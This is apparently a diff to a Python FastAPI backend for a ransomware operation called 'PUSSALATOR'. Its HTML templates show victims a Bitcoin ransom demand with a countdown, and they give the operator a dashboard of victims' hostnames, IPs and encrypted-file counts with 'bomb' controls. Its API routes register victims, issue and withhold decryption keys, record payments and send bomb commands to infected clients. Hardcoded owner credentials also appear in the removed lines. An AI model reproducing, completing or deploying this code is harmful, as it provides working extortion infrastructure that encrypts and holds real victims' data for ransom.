+                if (!response.ok) throw new Error('Victim not found');
+                const v = await response.json();
+                
+                let html = '<div class="info-box">';
+                html += `
+                    <div class="info-row"><span class="info-label">Victim ID:</span><span class="info-value">${v.id}</span></div>
+                    <div class="info-row"><span class="info-label">Hostname:</span><span class="info-value">${v.hostname || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">IP Address:</span><span class="info-value">${v.ip || '0.0.0.0'}</span></div>
+                    <div class="info-row"><span class="info-label">Location:</span><span class="info-value">${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span></div>
+                    <div class="info-row"><span class="info-label">Files Encrypted:</span><span class="info-value">${(v.files || 0).toLocaleString()}</span></div>
+                    <div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">
+                        <span class="info-label">Ransom:</span><span class="info-value" style="color:#ffaa00;">${v.ransom || '0.5 BTC'}</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">BTC Address:</span><span class="info-value" style="font-size:12px;">${v.wallet || '1PussWalletVMTest'}</span>
+                    </div>
+                </div>`;
+                
+                if (v.status === 'paid') {
+                    html += `<div class="status-box status-paid">✓ PAID ✓</div>`;
+                    if (v.key) {
+                        html += `<div class="key-box"><strong>🔑 KEY:</strong><br>${v.key}</div>`;
+                        html += `<div style="text-align:center;"><button class="button button-small" onclick="copyKey('${v.key}')">📋 COPY</button></div>`;
                     }
-                    
-                    document.getElementById('content').innerHTML = html;
-                    
-                    if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
-                })
-                .catch(function() {
-                    document.getElementById('content').innerHTML = '<div style="color:#ff0000;padding:40px;text-align:center;">> ERROR: DATA CORRUPTED <</div>';
-                });
+                } else if (v.status === 'expired') {
+                    html += `<div class="status-box status-expired">✗ EXPIRED ✗</div>`;
+                } else {
+                    html += `<div class="status-box status-unpaid">⏳ UNPAID ⏳</div>`;
+                    html += `<div class="btc-address" id="btcAddress">${v.wallet || '1PussWalletVMTest'}</div>`;
+                    html += `<div style="text-align:center;"><button class="copy-btn" onclick="copyBtc()">📋 COPY BTC</button></div>`;
+                    html += `<div class="timer" id="timer">Loading...</div>`;
+                }
+                
+                document.getElementById('content').innerHTML = html;
+                
+                if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
+                
+            } catch(e) {
+                document.getElementById('content').innerHTML = `<div style="color:#ff0000;padding:40px;text-align:center;">Error loading data</div>`;
+            }
         }
         
         function updateTimer(deadlineStr) {
-            var deadline = new Date(deadlineStr).getTime();
+            const deadline = new Date(deadlineStr).getTime();
             function tick() {
-                var diff = deadline - new Date().getTime();
+                const diff = deadline - new Date().getTime();
                 if (diff <= 0) {
-                    document.getElementById('timer').innerHTML = '>> EXPIRED <<';
-                    setTimeout(function() { location.reload(); }, 2000);
+                    document.getElementById('timer').innerHTML = '⏰ EXPIRED ⏰';
+                    setTimeout(() => location.reload(), 2000);
                     return;
                 }
-                var h = Math.floor(diff/(1000*60*60));
-                var m = Math.floor((diff%(1000*60*60))/(1000*60));
-                var s = Math.floor((diff%(1000*60))/1000);
-                document.getElementById('timer').innerHTML = 
-                    (h < 10 ? '0' + h : h) + ':' + 
-                    (m < 10 ? '0' + m : m) + ':' + 
-                    (s < 10 ? '0' + s : s);
+                const h = Math.floor(diff/(1000*60*60));
+                const m = Math.floor((diff%(1000*60*60))/(1000*60));
+                const s = Math.floor((diff%(1000*60))/1000);
+                document.getElementById('timer').innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
             }
             tick();
             setInterval(tick, 1000);
         }
         
-        function copyKey(k) { 
-            navigator.clipboard.writeText(k).then(function() { alert('KEY COPIED'); }); 
-        }
+        function copyKey(k) { navigator.clipboard.writeText(k).then(() => alert('✓ Key copied')); }
         function copyBtc() { 
-            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(function() { alert('BTC ADDRESS COPIED'); }); 
+            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(() => alert('✓ BTC address copied')); 
         }
         
         loadStatus();
@@ -897,99 +755,69 @@ OWNER_DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PUSSALATOR - OWNER CONTROL</title>
+    <title>Owner Dashboard - PUSSALATOR</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background: #000000;
-            color: #33ff33;
-            font-family: 'Courier New', 'Terminal', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
             margin: 0;
-            padding: 0;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" fill="%23000000"/><path d="M0 0 L40 40 M40 0 L0 40" stroke="%231a0000" stroke-width="0.5"/></svg>');
+            padding: 15px;
         }
         .navbar {
             background: #1a0000;
             padding: 15px;
-            border-bottom: 3px solid #ff0000;
+            border-bottom: 2px solid #ff0000;
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
-            border-top: 1px solid #330000;
         }
         .navbar h1 {
             color: #ff0000;
             margin: 0;
             font-size: 28px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 2px 2px 0 #330000;
         }
         .nav-links button {
-            background: #330000;
-            color: #ff6666;
-            border: 2px solid #ff0000;
+            background: #ff0000;
+            color: black;
+            border: none;
             padding: 8px 15px;
             margin-left: 10px;
             cursor: pointer;
             font-family: 'Courier New', monospace;
             font-weight: bold;
-            text-transform: uppercase;
         }
         .nav-links button:hover {
-            background: #ff0000;
-            color: #000000;
-        }
-        .login-form {
-            background: #1a0000;
-            border: 3px solid #ff0000;
-            padding: 30px;
-            max-width: 400px;
-            margin: 100px auto;
-            text-align: center;
-            box-shadow: 10px 10px 0 #330000;
-        }
-        .login-form h2 {
-            color: #ff0000;
-            margin-top: 0;
-        }
-        .login-form input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            background: #000000;
-            border: 2px solid #ff0000;
-            color: #33ff33;
-            font-family: 'Courier New', monospace;
+            background: #ff6666;
         }
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
-            padding: 0 15px;
         }
         .stat-card {
             background: #1a0000;
-            border: 2px solid #ff0000;
+            border: 1px solid #ff0000;
             padding: 15px;
             text-align: center;
-            box-shadow: 5px 5px 0 #330000;
         }
         .stat-value {
-            font-size: 32px;
+            font-size: 28px;
             color: #ff0000;
             font-weight: bold;
-            font-family: 'Courier New', monospace;
+        }
+        .stat-label {
+            font-size: 12px;
+            color: #ff9999;
         }
         .table-container {
             overflow-x: auto;
             background: #1a0000;
-            border: 2px solid #ff0000;
-            margin: 0 15px;
-            box-shadow: 5px 5px 0 #330000;
+            border: 1px solid #ff0000;
         }
         table {
             width: 100%;
@@ -1001,40 +829,39 @@ OWNER_DASHBOARD_TEMPLATE = """
             color: #ff0000;
             padding: 12px;
             text-align: left;
-            border-bottom: 2px solid #ff0000;
-            text-transform: uppercase;
         }
         td {
             padding: 10px 12px;
             border-bottom: 1px solid #330000;
-            color: #33ff33;
         }
-        .status-paid { color: #33ff33; }
-        .status-unpaid { color: #ffaa00; }
+        tr:hover {
+            background: #330000;
+        }
+        .status-paid { color: #00ff00; }
+        .status-unpaid { color: #ffff00; }
         .status-expired { color: #ff6666; }
         .bomb-active {
             color: #ff0000;
+            animation: blink 1s infinite;
             font-weight: bold;
-            animation: blink 1s step-end infinite;
         }
         @keyframes blink {
-            0%, 100% { opacity: 1; }
+            0% { opacity: 1; }
             50% { opacity: 0.3; }
+            100% { opacity: 1; }
         }
         .action-btn {
-            background: #220000;
+            background: #333;
             color: #ff6666;
             border: 1px solid #ff0000;
             padding: 4px 8px;
             margin: 2px;
             cursor: pointer;
             font-size: 11px;
-            font-family: 'Courier New', monospace;
-            text-transform: uppercase;
         }
         .action-btn:hover {
             background: #ff0000;
-            color: #000000;
+            color: black;
         }
         .modal {
             display: none;
@@ -1051,13 +878,12 @@ OWNER_DASHBOARD_TEMPLATE = """
         .modal.show { display: flex; }
         .modal-content {
             background: #1a0000;
-            border: 3px solid #ff0000;
+            border: 2px solid #ff0000;
             padding: 25px;
             max-width: 600px;
             width: 90%;
             max-height: 80vh;
             overflow-y: auto;
-            box-shadow: 10px 10px 0 #330000;
         }
         .close {
             color: #ff6666;
@@ -1065,268 +891,136 @@ OWNER_DASHBOARD_TEMPLATE = """
             cursor: pointer;
             float: right;
         }
-        .close:hover {
-            color: #ff0000;
-        }
-        .telegram-status {
-            background: #0a0000;
-            border: 2px solid #ff0000;
-            padding: 10px;
-            margin: 15px;
-            font-size: 12px;
-        }
-        .telegram-enabled { color: #33ff33; }
-        .telegram-disabled { color: #ff0000; }
-        .error { color: #ff0000; margin: 10px 0; }
-        .section-title {
-            color: #ff0000;
-            margin-left: 15px;
-            text-transform: uppercase;
-            border-left: 4px solid #ff0000;
-            padding-left: 10px;
-        }
     </style>
 </head>
 <body>
-    <div id="loginView" style="display: block;">
-        <div class="login-form">
-            <h2>OWNER LOGIN</h2>
-            <input type="text" id="owner_id" placeholder="OWNER ID" value="40671Mps19*">
-            <input type="password" id="password" placeholder="PASSWORD" value="pussalator123">
-            <button class="action-btn" onclick="login()" style="width:100%; padding:10px;">>> LOGIN <<</button>
-            <div id="loginError" class="error"></div>
+    <div class="navbar">
+        <h1>⚙️ OWNER DASHBOARD</h1>
+        <div class="nav-links">
+            <button onclick="loadData()">🔄 REFRESH</button>
+            <button onclick="logout()">🚪 LOGOUT</button>
         </div>
     </div>
     
-    <div id="dashboardView" style="display: none;">
-        <div class="navbar">
-            <h1>OWNER CONTROL</h1>
-            <div class="nav-links">
-                <button onclick="loadData()">[ REFRESH ]</button>
-                <button onclick="testTelegram()">[ TEST TELEGRAM ]</button>
-                <button onclick="logout()">[ LOGOUT ]</button>
-            </div>
-        </div>
-        
-        <div class="telegram-status" id="telegramStatus">
-            > LOADING TELEGRAM STATUS...
-        </div>
-        
-        <h3 class="section-title">SYSTEM STATISTICS</h3>
-        <div class="stats-grid" id="statsGrid">
-            <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div>TOTAL</div></div>
-            <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div>PAID</div></div>
-            <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div>UNPAID</div></div>
-            <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div>EXPIRED</div></div>
-            <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div>FILES</div></div>
-            <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div>BOMBS</div></div>
-            <div class="stat-card"><div class="stat-value" id="paidToday">0</div><div>PAID TODAY</div></div>
-        </div>
-        
-        <h3 class="section-title">ACTIVE VICTIMS</h3>
-        <div class="table-container">
-            <table id="victimsTable">
-                <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>HOSTNAME</th>
-                        <th>IP</th>
-                        <th>FILES</th>
-                        <th>STATUS</th>
-                        <th>BOMB</th>
-                        <th>CREATED</th>
-                        <th>ACTIONS</th>
-                    </tr>
-                </thead>
-                <tbody id="tableBody">
-                    <tr><td colspan="8" style="text-align:center;padding:40px;">> LOADING VICTIMS...</td></tr>
-                </tbody>
-            </table>
-        </div>
+    <div class="stats-grid" id="statsGrid">
+        <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
+        <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
+        <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
+        <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
+        <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
+        <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
     </div>
     
+    <div class="table-container">
+        <table id="victimsTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>HOSTNAME</th>
+                    <th>IP</th>
+                    <th>FILES</th>
+                    <th>STATUS</th>
+                    <th>BOMB</th>
+                    <th>ACTIONS</th>
+                </tr>
+            </thead>
+            <tbody id="tableBody">
+                <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
+            </tbody>
+        </table>
+    </div>
+    
+    <!-- Victim Modal -->
     <div class="modal" id="victimModal">
         <div class="modal-content">
             <div class="modal-header">
                 <h2 style="color:#ff0000;">VICTIM DETAILS</h2>
-                <span class="close" onclick="closeModal()">X</span>
+                <span class="close" onclick="closeModal()">&times;</span>
             </div>
             <div id="victimDetails"></div>
-            <div style="margin-top:20px; text-align:center;">
-                <button class="action-btn" onclick="markPaid()">MARK PAID</button>
-                <button class="action-btn" onclick="startBomb()">START BOMB</button>
-                <button class="action-btn" onclick="stopBomb()">STOP BOMB</button>
-                <button class="action-btn" onclick="deleteVictim()">DELETE</button>
+            <div style="margin-top:20px;">
+                <button class="action-btn" onclick="markPaid()">💰 MARK PAID</button>
+                <button class="action-btn" onclick="deleteVictim()">❌ DELETE</button>
             </div>
         </div>
     </div>
 
     <script>
-        var currentVictim = null;
-        var victims = [];
-        var accessToken = localStorage.getItem('access_token');
+        let currentVictim = null;
+        let victims = [];
         
-        if (accessToken) {
-            document.getElementById('loginView').style.display = 'none';
-            document.getElementById('dashboardView').style.display = 'block';
-            loadData();
+        async function loadData() {
+            await loadStats();
+            await loadVictims();
         }
         
-        function login() {
-            var owner_id = document.getElementById('owner_id').value;
-            var password = document.getElementById('password').value;
-            
-            fetch('/api/owner/login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({owner_id: owner_id, password: password})
-            })
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                if (data.access_token) {
-                    localStorage.setItem('access_token', data.access_token);
-                    document.getElementById('loginView').style.display = 'none';
-                    document.getElementById('dashboardView').style.display = 'block';
-                    loadData();
-                } else {
-                    document.getElementById('loginError').innerText = '> ACCESS DENIED';
-                }
-            })
-            .catch(function() {
-                document.getElementById('loginError').innerText = '> CONNECTION ERROR';
-            });
-        }
-        
-        function logout() {
-            localStorage.removeItem('access_token');
-            document.getElementById('loginView').style.display = 'block';
-            document.getElementById('dashboardView').style.display = 'none';
-        }
-        
-        function loadData() {
-            loadTelegramStatus();
-            loadStats();
-            loadVictims();
-        }
-        
-        function loadTelegramStatus() {
-            fetch('/api/telegram/status', {
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                var statusDiv = document.getElementById('telegramStatus');
-                if (data.enabled) {
-                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-enabled">ENABLED</span> | CHAT ID: ' + data.chat_id;
-                } else {
-                    statusDiv.innerHTML = '> TELEGRAM BOT: <span class="telegram-disabled">DISABLED</span>';
-                }
-            })
-            .catch(function() {
-                document.getElementById('telegramStatus').innerHTML = '> TELEGRAM STATUS: UNKNOWN';
-            });
-        }
-        
-        function testTelegram() {
-            fetch('/api/telegram/test', {
-                method: 'POST',
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                alert(data.success ? 'TEST MESSAGE SENT' : 'TEST FAILED');
-            })
-            .catch(function() {
-                alert('TEST ERROR');
-            });
-        }
-        
-        function loadStats() {
-            fetch('/api/stats')
-            .then(function(response) { return response.json(); })
-            .then(function(stats) {
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/stats');
+                const stats = await response.json();
                 document.getElementById('totalVictims').textContent = stats.total || 0;
                 document.getElementById('paidVictims').textContent = stats.paid || 0;
                 document.getElementById('unpaidVictims').textContent = stats.unpaid || 0;
                 document.getElementById('expiredVictims').textContent = stats.expired || 0;
                 document.getElementById('totalFiles').textContent = (stats.total_files || 0).toLocaleString();
                 document.getElementById('activeBombs').textContent = stats.active_bombs || 0;
-                document.getElementById('paidToday').textContent = stats.paid_today || 0;
-            })
-            .catch(function() {
-                console.error('Stats error');
-            });
+            } catch(e) {
+                console.error('Stats error:', e);
+            }
         }
         
-        function loadVictims() {
-            fetch('/api/owner/victims', {
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                victims = data;
+        async function loadVictims() {
+            try {
+                const response = await fetch('/api/owner/victims');
+                victims = await response.json();
                 renderTable();
-            })
-            .catch(function() {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;color:#ff0000;">> ERROR LOADING VICTIMS</td></tr>';
-            });
+            } catch(e) {
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;color:#ff0000;">Error loading victims</td></tr>';
+            }
         }
         
         function renderTable() {
             if (!victims.length) {
-                document.getElementById('tableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;">> NO VICTIMS FOUND</td></tr>';
+                document.getElementById('tableBody').innerHTML = '<tr><td colspan="7" style="text-align:center;">No victims found</td></tr>';
                 return;
             }
             
-            var html = '';
-            for (var i = 0; i < victims.length; i++) {
-                var v = victims[i];
-                var bombDisplay = v.bomb_status === 'active' ? 'ACTIVE' : 'INACTIVE';
-                var bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
-                var created = v.created ? new Date(v.created).toLocaleString() : 'UNKNOWN';
+            let html = '';
+            victims.forEach(v => {
+                const bombIcon = v.bomb_status === 'active' ? '💣 ACTIVE' : '⚫';
+                const bombClass = v.bomb_status === 'active' ? 'bomb-active' : '';
                 
-                html += '<tr>' +
-                    '<td><small>' + (v.id || '').substring(0, 20) + '...</small></td>' +
-                    '<td>' + (v.hostname || 'UNKNOWN') + '</td>' +
-                    '<td>' + (v.ip || '0.0.0.0') + '</td>' +
-                    '<td>' + (v.files || 0).toLocaleString() + '</td>' +
-                    '<td><span class="status-' + (v.status || 'unknown') + '">' + (v.status || 'UNKNOWN').toUpperCase() + '</span></td>' +
-                    '<td class="' + bombClass + '">' + bombDisplay + '<br><small>' + (v.bomb_size || 0).toFixed(1) + 'GB</small></td>' +
-                    '<td><small>' + created + '</small></td>' +
-                    '<td>' +
-                        '<button class="action-btn" onclick="viewVictim(\'' + v.id + '\')">VIEW</button>' +
-                    '</td>' +
-                '</tr>';
-            }
+                html += `<tr>
+                    <td><small>${(v.id || '').substring(0, 20)}...</small></td>
+                    <td>${v.hostname || 'Unknown'}</td>
+                    <td>${v.ip || '0.0.0.0'}</td>
+                    <td>${(v.files || 0).toLocaleString()}</td>
+                    <td><span class="status-${v.status || 'unknown'}">${v.status || 'unknown'}</span></td>
+                    <td class="${bombClass}">${bombIcon}<br><small>${(v.bomb_size || 0).toFixed(1)}GB</small></td>
+                    <td>
+                        <button class="action-btn" onclick="viewVictim('${v.id}')">VIEW</button>
+                    </td>
+                </tr>`;
+            });
             
             document.getElementById('tableBody').innerHTML = html;
         }
         
-        function viewVictim(victimId) {
-            fetch('/api/owner/victim/' + victimId, {
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) { return response.json(); })
-            .then(function(data) {
-                currentVictim = data;
+        async function viewVictim(victimId) {
+            try {
+                const response = await fetch(`/api/owner/victim/${victimId}`);
+                currentVictim = await response.json();
                 
-                var details = '';
-                for (var key in currentVictim) {
-                    if (currentVictim.hasOwnProperty(key) && key !== 'key') {
-                        var value = currentVictim[key];
-                        if (key === 'key' && currentVictim.status !== 'paid') {
-                            value = 'HIDDEN (unpaid)';
-                        }
-                        details += '<div style="padding:5px;background:#111;margin:2px 0;border-left:2px solid #330000;"><strong>' + key.toUpperCase() + ':</strong> ' + (value || 'N/A') + '</div>';
-                    }
+                let details = '';
+                for (const [key, value] of Object.entries(currentVictim)) {
+                    details += `<div style="padding:5px;background:#111;margin:2px 0;"><strong>${key}:</strong> ${value || 'N/A'}</div>`;
                 }
                 
                 document.getElementById('victimDetails').innerHTML = details;
                 document.getElementById('victimModal').classList.add('show');
-            })
-            .catch(function() {
-                alert('ERROR LOADING VICTIM DETAILS');
-            });
+            } catch(e) {
+                alert('Error loading victim details');
+            }
         }
         
         function closeModal() {
@@ -1334,113 +1028,74 @@ OWNER_DASHBOARD_TEMPLATE = """
             currentVictim = null;
         }
         
-        function markPaid() {
+        async function markPaid() {
             if (!currentVictim) return;
             
-            fetch('/api/owner/mark-paid/' + currentVictim.id, {
-                method: 'POST',
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) {
+            try {
+                const response = await fetch(`/api/owner/mark-paid/${currentVictim.id}`, {
+                    method: 'POST'
+                });
+                
                 if (response.ok) {
-                    alert('MARKED AS PAID');
+                    alert('Marked as paid!');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error marking as paid');
+            }
+        }
+        
+        async function deleteVictim() {
+            if (!currentVictim) return;
+            if (!confirm(`⚠️ DELETE ${currentVictim.id}?`)) return;
+            
+            try {
+                const response = await fetch(`/api/owner/delete-victim/${currentVictim.id}`, {
+                    method: 'DELETE'
+                });
+                
+                if (response.ok) {
+                    alert('Victim deleted');
                     closeModal();
                     loadVictims();
                     loadStats();
                 }
-            })
-            .catch(function() {
-                alert('ERROR');
-            });
+            } catch(e) {
+                alert('Error deleting victim');
+            }
         }
         
-        function startBomb() {
-            if (!currentVictim) return;
-            
-            fetch('/api/owner/bomb/start', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
-                },
-                body: JSON.stringify({victim_id: currentVictim.id})
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    alert('BOMB STARTED');
-                    closeModal();
-                    loadVictims();
-                }
-            })
-            .catch(function() {
-                alert('ERROR');
-            });
+        async function logout() {
+            await fetch('/api/owner/logout', { method: 'POST' });
+            window.location.href = '/';
         }
         
-        function stopBomb() {
-            if (!currentVictim) return;
-            
-            fetch('/api/owner/bomb/stop', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': 'Bearer ' + localStorage.getItem('access_token')
-                },
-                body: JSON.stringify({victim_id: currentVictim.id})
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    alert('BOMB STOPPED');
-                    closeModal();
-                    loadVictims();
-                }
-            })
-            .catch(function() {
-                alert('ERROR');
-            });
-        }
-        
-        function deleteVictim() {
-            if (!currentVictim) return;
-            if (!confirm('DELETE VICTIM ' + currentVictim.id + '?')) return;
-            
-            fetch('/api/owner/delete-victim/' + currentVictim.id, {
-                method: 'DELETE',
-                headers: {'Authorization': 'Bearer ' + localStorage.getItem('access_token')}
-            })
-            .then(function(response) {
-                if (response.ok) {
-                    alert('VICTIM DELETED');
-                    closeModal();
-                    loadVictims();
-                    loadStats();
-                }
-            })
-            .catch(function() {
-                alert('ERROR');
-            });
-        }
-        
+        loadData();
         setInterval(loadData, 30000);
     </script>
 </body>
 </html>
 """
+
 # ============================================================================
 # ROUTES - PUBLIC PAGES
 # ============================================================================
 
 @app.get("/", response_class=HTMLResponse)
 async def login_page():
+    """Main login page"""
     return HTMLResponse(content=LOGIN_PAGE)
 
 @app.get("/victim/{victim_id}", response_class=HTMLResponse)
 async def victim_page(victim_id: str):
+    """Victim status page"""
     html = VICTIM_PAGE_TEMPLATE.replace('{{ victim_id }}', victim_id)
     return HTMLResponse(content=html)
 
 @app.get("/owner/dashboard", response_class=HTMLResponse)
 async def owner_dashboard():
+    """Owner dashboard"""
     return HTMLResponse(content=OWNER_DASHBOARD_TEMPLATE)
 
 # ============================================================================
@@ -1449,10 +1104,12 @@ async def owner_dashboard():
 
 @app.get("/api/stats")
 async def api_stats():
+    """Public stats endpoint - REAL DATA FROM SUPABASE"""
     return get_stats()
 
 @app.get("/api/victim/{victim_id}")
 async def api_get_victim(victim_id: str):
+    """Get victim details (public)"""
     try:
         result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
@@ -1461,12 +1118,14 @@ async def api_get_victim(victim_id: str):
         
         victim = result.data[0]
         
+        # Check deadline
         if victim['status'] == 'unpaid' and victim.get('deadline'):
             deadline = datetime.fromisoformat(victim['deadline'].replace('Z', '+00:00'))
             if datetime.utcnow() > deadline:
                 supabase_admin.table('victims').update({'status': 'expired'}).eq('id', victim_id).execute()
                 victim['status'] = 'expired'
         
+        # Don't send key unless paid
         if victim['status'] != 'paid':
             victim['key'] = None
         
@@ -1475,20 +1134,27 @@ async def api_get_victim(victim_id: str):
     except HTTPException:
         raise
     except Exception as e:
+        print(f"Error getting victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/add-victim")
 async def api_add_victim(victim_data: VictimRegister):
+    """Register new victim (called by client)"""
     try:
         victim_id = victim_data.victim_id or generate_victim_id()
         
+        # Check if exists
         existing = supabase_admin.table('victims').select('id').eq('id', victim_id).execute()
         if existing.data:
             raise HTTPException(status_code=400, detail="Victim exists")
         
+        # Calculate deadline
         deadline = (datetime.utcnow() + timedelta(hours=Config.DEFAULT_DEADLINE_HOURS)).isoformat()
+        
+        # Generate key
         encryption_key = generate_encryption_key()
         
+        # Prepare victim data
         victim_dict = {
             'id': victim_id,
             'key': encryption_key,
@@ -1511,11 +1177,12 @@ async def api_add_victim(victim_data: VictimRegister):
             'bomb_size': 0
         }
         
-        result = supabase_admin.table('victims').insert(victim_dict).execute()
+        # Insert into Supabase
+        supabase_admin.table('victims').insert(victim_dict).execute()
         
-        location = f"{victim_data.city}, {victim_data.country}" if victim_data.city != 'Unknown' else victim_data.country
-        telegram.notify_new_victim(victim_id, location, victim_data.ip, victim_data.hostname)
+        print(f"[+] New victim registered: {victim_id}")
         
+        # Prepare response
         response = {
             'victim_id': victim_id,
             'key': encryption_key,
@@ -1534,6 +1201,7 @@ async def api_add_victim(victim_data: VictimRegister):
 
 @app.post("/api/update-victim")
 async def api_update_victim(update_data: VictimUpdate):
+    """Update victim info"""
     try:
         update_dict = {
             'last_seen': datetime.utcnow().isoformat()
@@ -1547,29 +1215,28 @@ async def api_update_victim(update_data: VictimUpdate):
         return {'success': True}
         
     except Exception as e:
+        print(f"Error updating victim: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/verify-payment")
 async def api_verify_payment(payment_data: PaymentVerify):
+    """Verify payment from client"""
     try:
+        # Update victim
         supabase_admin.table('victims').update({
             'status': 'paid',
             'paid_at': datetime.utcnow().isoformat(),
             'tx': payment_data.tx_id
         }).eq('id', payment_data.victim_id).execute()
         
-        victim = supabase_admin.table('victims').select('*').eq('id', payment_data.victim_id).execute()
+        # Get key
+        victim = supabase_admin.table('victims').select('key').eq('id', payment_data.victim_id).execute()
+        key = victim.data[0]['key'] if victim.data else None
         
-        if victim.data:
-            telegram.notify_payment(
-                payment_data.victim_id,
-                victim.data[0].get('ransom', '0.5 BTC'),
-                payment_data.tx_id
-            )
-        
-        return {'success': True, 'key': victim.data[0]['key'] if victim.data else None}
+        return {'success': True, 'key': key}
         
     except Exception as e:
+        print(f"Error verifying payment: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
@@ -1578,6 +1245,7 @@ async def api_verify_payment(payment_data: PaymentVerify):
 
 @app.get("/api/bomb/command/{victim_id}")
 async def api_get_bomb_command(victim_id: str):
+    """Get pending bomb command"""
     victim = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
     
     if victim.data and victim.data[0].get('bomb_status') == 'active':
@@ -1587,154 +1255,105 @@ async def api_get_bomb_command(victim_id: str):
 
 @app.post("/api/bomb/update")
 async def api_bomb_update(bomb_data: BombUpdate):
+    """Update bomb status"""
     try:
         update_dict = {}
         
         if bomb_data.error:
             update_dict['bomb_status'] = 'error'
-            telegram.notify_bomb_stop(bomb_data.client_id)
         else:
             update_dict['bomb_size'] = bomb_data.size_gb
-            
-            victim = supabase_admin.table('victims').select('bomb_status').eq('id', bomb_data.client_id).execute()
-            if victim.data and victim.data[0].get('bomb_status') != 'active' and bomb_data.size_gb > 0:
-                update_dict['bomb_status'] = 'active'
-                telegram.notify_bomb_start(bomb_data.client_id)
         
         supabase_admin.table('victims').update(update_dict).eq('id', bomb_data.client_id).execute()
         
         return {'success': True}
         
     except Exception as e:
+        print(f"Error updating bomb: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
 # ============================================================================
-# ROUTES - API (Telegram)
+# ROUTES - API (Owner Only - SIMPLE SESSION)
 # ============================================================================
 
-@app.get("/api/telegram/status", dependencies=[Depends(JWTBearer())])
-async def api_telegram_status():
-    return {
-        'enabled': telegram.enabled,
-        'chat_id': telegram.chat_id if telegram.enabled else None
-    }
+# Simple session store (in memory - for demo)
+owner_session = False
 
-@app.post("/api/telegram/test", dependencies=[Depends(JWTBearer())])
-async def api_telegram_test():
-    if not telegram.enabled:
-        raise HTTPException(status_code=400, detail="Telegram not configured")
-    
-    success = telegram.send("🧪 <b>TEST MESSAGE</b>\n\nOwner dashboard test")
-    return {'success': success}
-
-# ============================================================================
-# ROUTES - API (Owner Only with JWT Auth) - FIXED FOR OWNER ID
-# ============================================================================
-
-@app.post("/api/owner/login", response_model=OwnerLoginResponse)
+@app.post("/api/owner/login")
 async def api_owner_login(login_data: OwnerLogin):
-    """Owner login using Supabase Auth with Owner ID"""
-    try:
-        # First, authenticate with Supabase using email/password
-        # We'll use the owner email that we created
-        auth_response = supabase.auth.sign_in_with_password({
-            "email": Config.OWNER_EMAIL,
